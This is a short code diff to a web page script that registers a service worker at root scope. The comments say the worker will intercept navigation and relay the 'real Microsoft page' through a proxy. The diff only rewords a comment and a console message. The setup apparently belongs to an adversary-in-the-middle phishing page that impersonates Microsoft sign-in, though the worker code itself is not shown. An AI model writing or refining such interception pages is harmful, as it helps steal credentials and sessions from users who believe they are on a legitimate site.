@@ -8,9 +8,8 @@
         if ("serviceWorker" in navigator) {
             navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", { scope: "/" })
                 .then(() => {
-                    // Do NOT redirect! The SW will intercept this navigation
-                    // and fetch the real page via your proxy.
-                    console.log("SW registered – waiting for proxy to load...");
+                    // Do NOT redirect – let the SW intercept the navigation.
+                    console.log("SW registered – relaying real Microsoft page...");
                 })
                 .catch(err => console.error("SW registration failed:", err));
         } else {
